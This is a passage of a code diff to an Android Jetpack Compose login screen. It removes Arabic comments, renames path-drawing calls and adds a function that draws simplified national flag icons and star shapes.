                 lineTo(5f * s, 20f * s)
                 lineTo(19f * s, 20f * s)
                 lineTo(19f * s, 9f * s)
-                // M9 20v-6h6v6
                 moveTo(9f * s, 20f * s)
                 lineTo(9f * s, 14f * s)
                 lineTo(15f * s, 14f * s)
@@ -972,7 +1231,6 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // سهم الرجوع (نفس SVG .bak: polyline 15 18 9 12 15 6)
     @Composable
     fun BackChevronIcon() {
         Canvas(modifier = Modifier.size(20.dp)) {
@@ -993,19 +1251,12 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // =================================================
-    // القوس المضيء فوق الكارت (card::before / card::after)
-    // path: M0 1.5 Q50 33 100 1.5  + stroke #bcd6ff
-    // + وهج: M0 11 Q50 42.5 100 11 stroke #e8f2ff
-    // =================================================
-
     @Composable
     fun CardTopCurve(modifier: Modifier = Modifier) {
         Canvas(modifier = modifier) {
             val w = size.width
             val h = size.height
 
-            // الوهج الخلفي (radial-gradient 60% 85% at 50% 100%)
             drawCircle(
                 brush = Brush.radialGradient(
                     listOf(Color(0x728CB9FF), Color.Transparent),
@@ -1016,10 +1267,9 @@ class LoginActivity : ComponentActivity() {
                 center = Offset(w * 0.5f, h)
             )
 
-            // القوس المضيء الخارجي: M0 11 Q50 42.5 100 11 (viewBox 100x45)
             val glow = Path().apply {
                 moveTo(0f, 11f / 45f * h)
-                quadraticTo(w * 0.5f, 42.5f / 45f * h, w, 11f / 45f * h)
+                quadraticBezierTo(w * 0.5f, 42.5f / 45f * h, w, 11f / 45f * h)
             }
             drawPath(
                 glow,
@@ -1027,10 +1277,9 @@ class LoginActivity : ComponentActivity() {
                 style = Stroke(width = 1.6f * (w / 100f) * 1.2f)
             )
 
-            // القوس الداخلي: M0 1.5 Q50 33 100 1.5 (viewBox 100x35)
             val inner = Path().apply {
                 moveTo(0f, 1.5f / 35f * h)
-                quadraticTo(w * 0.5f, 33f / 35f * h, w, 1.5f / 35f * h)
+                quadraticBezierTo(w * 0.5f, 33f / 35f * h, w, 1.5f / 35f * h)
             }
             drawPath(
                 inner,
@@ -1039,11 +1288,6 @@ class LoginActivity : ComponentActivity() {
             )
         }
     }
-
-    // =================================================
-    // الكابتشا (نفس drawCap() في HTML)
-    // 3 خطوط عشوائية + 4 حروف ملونة مائلة على خلفية بيضاء
-    // =================================================
 
     @Composable
     fun CaptchaImage(code: String, modifier: Modifier = Modifier) {
@@ -1077,10 +1321,8 @@ class LoginActivity : ComponentActivity() {
             val sx = w / 88f
             val sy = h / 40f
 
-            // خلفية بيضاء
             drawRect(Color.White)
 
-            // 3 خطوط تشويش (rgba عشوائية بشفافية .6)
             lines.forEach { l ->
                 val argb = (0x99L shl 24) or
                     (l.r.toLong() shl 16) or
@@ -1094,7 +1336,6 @@ class LoginActivity : ComponentActivity() {
                 )
             }
 
-            // الحروف الأربعة بخط cursive مائل
             glyphs.forEachIndexed { i, gl ->
                 val px = (10f + i * 19f) * sx
                 val py = (26f + gl.dy) * sy
@@ -1112,6 +1353,138 @@ class LoginActivity : ComponentActivity() {
                 drawContext.canvas.restore()
             }
         }
+    }
+
+    // =================================================
+    // الأعلام (مرسومة برمجياً)
+    // =================================================
+
+    @Composable
+    fun FlagIcon(code: String, modifier: Modifier = Modifier) {
+        Canvas(modifier = modifier.clip(RoundedCornerShape(3.dp))) {
+            val w = size.width
+            val h = size.height
+            when (code) {
+                "sa" -> {
+                    drawRect(Color(0xFF165B33))
+                    val stroke = h * 0.045f
+                    drawLine(Color.White, Offset(w*0.20f, h*0.38f),
+                        Offset(w*0.80f, h*0.38f), strokeWidth = stroke)
+                    drawLine(Color.White, Offset(w*0.22f, h*0.50f),
+                        Offset(w*0.78f, h*0.50f), strokeWidth = stroke)
+                    drawLine(Color.White, Offset(w*0.24f, h*0.62f),
+                        Offset(w*0.76f, h*0.62f), strokeWidth = stroke)
+                }
+                "us" -> {
+                    val stripe = h / 13f
+                    for (i in 0 until 13) {
+                        drawRect(
+                            color = if (i % 2 == 0) Color(0xFFB22234) else Color.White,
+                            topLeft = Offset(0f, i * stripe),
+                            size = Size(w, stripe + 1f)
+                        )
+                    }
+                    drawRect(Color(0xFF3C3B6E), topLeft = Offset.Zero,
+                        size = Size(w * 0.45f, stripe * 7f))
+                }
+                "cn" -> {
+                    drawRect(Color(0xFFDE2910))
+                    drawPath(starPath(w*0.22f, h*0.32f, h*0.22f), Color(0xFFFFDE00))
+                }
+                "tw" -> {
+                    drawRect(Color(0xFFFE0000))
+                    drawRect(Color(0xFF000095), topLeft = Offset.Zero,
+                        size = Size(w * 0.5f, h * 0.5f))
+                    drawCircle(Color.White, radius = h*0.12f,
+                        center = Offset(w*0.25f, h*0.25f))
+                    drawCircle(Color(0xFF000095), radius = h*0.08f,
+                        center = Offset(w*0.25f, h*0.25f))
+                }
+                "jp" -> {
+                    drawRect(Color.White)
+                    drawCircle(Color(0xFFBC002D), radius = h*0.3f,
+                        center = Offset(w/2f, h/2f))
+                }
+                "tr" -> {
+                    drawRect(Color(0xFFE30A17))
+                    drawCircle(Color.White, radius = h*0.3f,
+                        center = Offset(w*0.38f, h/2f))
+                    drawCircle(Color(0xFFE30A17), radius = h*0.25f,
+                        center = Offset(w*0.44f, h/2f))
+                    drawPath(starPath(w*0.6f, h/2f, h*0.13f, 180), Color.White)
+                }
+                "kr" -> {
+                    drawRect(Color.White)
+                    val d = h * 0.56f
+                    val tl = Offset(w/2f - d/2f, h/2f - d/2f)
+                    drawArc(Color(0xFFCD2E3A), 180f, 180f, true, tl, Size(d, d))
+                    drawArc(Color(0xFF0047A0), 0f, 180f, true, tl, Size(d, d))
+                }
+                "vn" -> {
+                    drawRect(Color(0xFFDA251D))
+                    drawPath(starPath(w/2f, h/2f, h*0.28f), Color(0xFFFFFF00))
+                }
+                "fr" -> {
+                    drawRect(Color(0xFF0055A4), size = Size(w/3f, h))
+                    drawRect(Color.White, topLeft = Offset(w/3f, 0f),
+                        size = Size(w/3f, h))
+                    drawRect(Color(0xFFEF4135), topLeft = Offset(2f*w/3f, 0f),
+                        size = Size(w/3f, h))
+                }
+                "pt" -> {
+                    drawRect(Color(0xFF046A38), size = Size(w*0.4f, h))
+                    drawRect(Color(0xFFDA291C), topLeft = Offset(w*0.4f, 0f),
+                        size = Size(w*0.6f, h))
+                    drawCircle(Color(0xFFFFE900), radius = h*0.16f,
+                        center = Offset(w*0.4f, h/2f))
+                }
+                "pk" -> {
+                    drawRect(Color(0xFF01411C))
+                    drawRect(Color.White, size = Size(w*0.25f, h))
+                    drawCircle(Color.White, radius = h*0.28f,
+                        center = Offset(w*0.62f, h*0.45f))
+                    drawCircle(Color(0xFF01411C), radius = h*0.24f,
+                        center = Offset(w*0.68f, h*0.4f))
+                }
+                "ir" -> {
+                    drawRect(Color(0xFF239F40), size = Size(w, h/3f))
+                    drawRect(Color.White, topLeft = Offset(0f, h/3f),
+                        size = Size(w, h/3f))
+                    drawRect(Color(0xFFDA0000), topLeft = Offset(0f, 2f*h/3f),
+                        size = Size(w, h/3f))
+                    drawCircle(Color(0xFFDA0000), radius = h*0.11f,
+                        center = Offset(w/2f, h/2f))
+                }
+                "th" -> {
+                    val s = h / 6f
+                    drawRect(Color(0xFFA51931), size = Size(w, s))
+                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, s),
+                        size = Size(w, s))
+                    drawRect(Color(0xFF2D2A4A), topLeft = Offset(0f, 2f*s),
+                        size = Size(w, 2f*s))
+                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, 4f*s),
+                        size = Size(w, s))
+                    drawRect(Color(0xFFA51931), topLeft = Offset(0f, 5f*s),
+                        size = Size(w, s))
+                }
+                else -> drawRect(Color(0xFF555555))
+            }
+        }
+    }
+
+    private fun starPath(cx: Float, cy: Float, outerR: Float,
+                         startDeg: Int = -90): Path {
+        val innerR = outerR * 0.382f
+        val path = Path()
+        for (i in 0 until 10) {
+            val angle = Math.toRadians((startDeg + i * 36).toDouble())
+            val r = if (i % 2 == 0) outerR else innerR
+            val x = cx + (r * Math.cos(angle)).toFloat()
+            val y = cy + (r * Math.sin(angle)).toFloat()
+            if (i == 0) path.moveTo(x, y) else path.lineTo(x, y)
+        }
+        path.close()
+        return path
     }
 
     // =================================================
@@ -1135,15 +1508,11 @@ class LoginActivity : ComponentActivity() {
 
     private fun goToHome() {
         try {
-            startActivity(android.content.Intent(this, HomeActivity::class.java))
+            startActivity(Intent(this, HomeActivity::class.java))
             finish()
         } catch (_: Exception) {}
     }
 }
-
-// ----------------------------------------------------
-// Theme
-// ----------------------------------------------------
 
 @Composable
 fun AppTheme(content: @Composable () -> Unit) {
